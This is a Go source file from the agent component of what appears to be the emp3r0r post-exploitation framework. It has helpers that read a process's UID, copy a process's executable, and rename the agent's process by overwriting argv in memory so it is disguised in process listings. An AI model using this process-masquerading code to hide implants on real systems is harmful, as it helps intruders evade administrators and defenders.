//go:build linux
// +build linux

package agent

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"reflect"
	"strings"
	"unsafe"

	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// ProcUID get euid of a process
func ProcUID(pid int) string {
	f, err := os.Open(fmt.Sprintf("/proc/%d/status", pid))
	if err != nil {
		return ""
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if strings.HasPrefix(line, "Uid:") {
			uid := strings.Fields(line)[1]
			return uid
		}
	}
	return ""
}

// CopyProcExeTo copy executable of an process to dest_path
func CopyProcExeTo(pid int, dest_path string) (err error) {
	elf_data, err := os.ReadFile(fmt.Sprintf("/proc/%d/exe", pid))
	if err != nil {
		return fmt.Errorf("Read %d exe: %v", pid, err)
	}

	// overwrite
	if util.IsExist(dest_path) {
		os.RemoveAll(dest_path)
	}

	return os.WriteFile(dest_path, elf_data, 0755)
}

// rename agent process by modifying its argv, all cmdline args are dropped
func crossPlatformSetProcName(name string) {
	for i := range os.Args {
		argvNstr := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[i]))
		argvN := (*[1 << 30]byte)(unsafe.Pointer(argvNstr.Data))[:argvNstr.Len]

		// pad name to match argv[0] length
		pad := argvNstr.Len - len(name)
		if pad > 0 {
			log.Printf("Padding %d of 0x00", pad)
			name += strings.Repeat("\x00", pad)
		}

		n := copy(argvN, name)
		if i > 0 {
			n = copy(argvN, []byte(strings.Repeat("\x00", argvNstr.Len)))
		}
		if n < len(argvN) {
			argvN[n] = 0
		}
	}
}
